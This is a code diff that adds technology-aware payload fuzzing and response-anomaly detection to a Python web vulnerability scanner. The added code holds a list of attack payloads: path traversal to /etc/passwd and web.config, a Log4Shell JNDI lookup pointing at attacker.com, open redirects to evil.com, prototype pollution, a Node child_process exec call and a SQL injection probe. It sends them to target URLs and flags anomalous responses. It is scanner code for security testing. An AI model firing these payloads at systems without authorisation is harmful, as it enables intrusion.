@@ -107,6 +107,12 @@ class FuzzerModule:
         self._fuzz_content_types(url)
         self._fuzz_path_traversal_endpoints(url)
         
+        # Technology-aware smart fuzzing
+        self._fuzz_tech_aware(url)
+        
+        # Response anomaly detection
+        self._fuzz_anomaly_detect(url)
+
         # External tool integrations
         self._paramspider_discover(url)
         self._ffufai_fuzz(url)
@@ -710,6 +716,191 @@ class FuzzerModule:
                 os.remove(output_file)
             except OSError:
                 pass
+
+    # ------------------------------------------------------------------
+    # Technology-Aware Smart Fuzzing
+    # ------------------------------------------------------------------
+
+    def _fuzz_tech_aware(self, url):
+        """Select fuzzing payloads based on detected technology stack."""
+        # Get detected technologies from engine context
+        detected_tech = set()
+        if hasattr(self.engine, 'context') and hasattr(self.engine.context, 'detected_tech'):
+            detected_tech = self.engine.context.detected_tech
+
+        tech_payloads = {
+            'PHP': [
+                ('file', '../../../../etc/passwd', 'LFI'),
+                ('page', 'php://filter/convert.base64-encode/resource=index', 'PHP Wrapper'),
+                ('cmd', ';phpinfo()', 'PHP Code Injection'),
+                ('debug', 'true', 'Debug Mode'),
+            ],
+            'Java': [
+                ('cmd', '${jndi:ldap://attacker.com/a}', 'Log4Shell'),
+                ('path', '..;/WEB-INF/web.xml', 'Java Path Traversal'),
+                ('redirect', 'https://evil.com', 'Open Redirect'),
+            ],
+            'ASP.NET': [
+                ('path', '..\\web.config', 'IIS Path Traversal'),
+                ('__VIEWSTATE', 'AAAA', 'ViewState Manipulation'),
+                ('redirect', 'https://evil.com', 'Open Redirect'),
+            ],
+            'Node.js': [
+                ('__proto__[isAdmin]', 'true', 'Prototype Pollution'),
+                ('constructor[prototype][isAdmin]', 'true', 'Prototype Pollution'),
+                ('cmd', 'require("child_process").exec("id")', 'SSTI/RCE'),
+            ],
+            'WordPress': [
+                ('action', 'heartbeat', 'WP Action Probe'),
+                ('rest_route', '/wp/v2/users', 'WP User Enum'),
+                ('wp_customize', 'on', 'WP Customizer'),
+            ],
+            'Django': [
+                ('__class__', 'test', 'SSTI Probe'),
+                ('admin', 'true', 'Admin Bypass'),
+                ('debug', 'true', 'Django Debug'),
+            ],
+            'Laravel': [
+                ('_method', 'PUT', 'Method Override'),
+                ('_token', 'bypass', 'CSRF Bypass'),
+                ('APP_KEY', 'test', 'Config Leak'),
+            ],
+        }
+
+        tested = 0
+        try:
+            baseline = self.requester.request(url, 'GET')
+            baseline_text = baseline.text if baseline else ''
+            baseline_len = len(baseline_text)
+            baseline_status = baseline.status_code if baseline else 0
+        except Exception:
+            return
+
+        for tech_name, payloads in tech_payloads.items():
+            # Test if this tech is detected, or test anyway for common ones
+            if detected_tech and tech_name not in detected_tech:
+                # Still test generic payloads for undetected frameworks
+                if tech_name not in ('PHP', 'Java', 'Node.js'):
+                    continue
+
+            for param, value, desc in payloads:
+                try:
+                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={value}"
+                    resp = self.requester.request(test_url, 'GET')
+                    if not resp:
+                        continue
+                    tested += 1
+
+                    # Detect anomalies
+                    if self._is_anomalous(resp, baseline_status, baseline_len, baseline_text):
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique=f"Fuzzer (Tech-Aware: {desc})",
+                            url=url, method='GET', param=param,
+                            payload=value,
+                            evidence=f"Tech: {tech_name}, Status: {resp.status_code}, "
+                                     f"Length delta: {abs(len(resp.text) - baseline_len)}",
+                            severity='MEDIUM', confidence=0.6,
+                        )
+                        self.engine.add_finding(finding)
+                except Exception:
+                    continue
+
+        if self.engine.config.get('verbose') and tested > 0:
+            print(f"{Colors.info(f'Tech-aware fuzzing: {tested} payloads tested')}")
+
+    # ------------------------------------------------------------------
+    # Response Anomaly Detection
+    # ------------------------------------------------------------------
+
+    def _fuzz_anomaly_detect(self, url):
+        """Send boundary/edge-case values and detect response anomalies."""
+        anomaly_payloads = [
+            ('id', '-1', 'Negative ID'),
+            ('id', '0', 'Zero ID'),
+            ('id', '99999999', 'Large ID'),
+            ('id', "1' OR '1'='1", 'SQLi Probe'),
+            ('page', '-1', 'Negative Page'),
+            ('limit', '99999', 'Large Limit'),
+            ('offset', '-1', 'Negative Offset'),
+            ('format', 'xml', 'Format Switch'),
+            ('format', 'json', 'Format Switch'),
+            ('callback', 'test', 'JSONP Probe'),
+            ('_debug', '1', 'Debug Flag'),
+            ('_internal', '1', 'Internal Flag'),
+            ('test', 'true', 'Test Mode'),
+            ('admin', '1', 'Admin Flag'),
+            ('role', 'admin', 'Role Escalation'),
+            ('price', '-1', 'Negative Price'),
+            ('quantity', '0', 'Zero Quantity'),
+            ('discount', '100', 'Full Discount'),
+        ]
+
+        try:
+            baseline = self.requester.request(url, 'GET')
+            if not baseline:
+                return
+            baseline_text = baseline.text
+            baseline_len = len(baseline_text)
+            baseline_status = baseline.status_code
+        except Exception:
+            return
+
+        for param, value, desc in anomaly_payloads:
+            try:
+                test_url = f"{url}{'&' if '?' in url else '?'}{param}={value}"
+                resp = self.requester.request(test_url, 'GET')
+                if not resp:
+                    continue
+
+                if self._is_anomalous(resp, baseline_status, baseline_len, baseline_text):
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique=f"Fuzzer (Anomaly: {desc})",
+                        url=url, method='GET', param=param,
+                        payload=value,
+                        evidence=f"Status: {resp.status_code} (baseline: {baseline_status}), "
+                                 f"Length: {len(resp.text)} (baseline: {baseline_len}), "
+                                 f"Body diff detected",
+                        severity='LOW', confidence=0.5,
+                    )
+                    self.engine.add_finding(finding)
+            except Exception:
+                continue
+
+    @staticmethod
+    def _is_anomalous(resp, baseline_status, baseline_len, baseline_text):
+        """Check if a response is anomalous compared to baseline."""
+        if not resp:
+            return False
+
+        # Status code change
+        if resp.status_code != baseline_status:
+            # Don't flag simple 404s or redirects as anomalies
+            if resp.status_code not in (404, 301, 302, 304):
+                return True
+
+        # Significant size difference
+        resp_len = len(resp.text) if resp.text else 0
+        if baseline_len > 0:
+            size_ratio = abs(resp_len - baseline_len) / max(baseline_len, 1)
+            if size_ratio > 0.5 and abs(resp_len - baseline_len) > 200:
+                return True
+
+        # Error pattern detection
+        error_patterns = [
+            'syntax error', 'unexpected', 'exception', 'traceback',
+            'stack trace', 'fatal error', 'warning:', 'mysql_',
+            'pg_query', 'ora-', 'sql', 'database error',
+            'internal server error', 'debug',
+        ]
+        resp_text = (resp.text or '').lower()[:3000]
+        baseline_lower = baseline_text.lower()[:3000] if baseline_text else ''
+        for pattern in error_patterns:
+            if pattern in resp_text and pattern not in baseline_lower:
+                return True
+
+        return False
     
     def _paramspider_discover(self, url):
         """Discover parameters using ParamSpider or native web archive fallback.
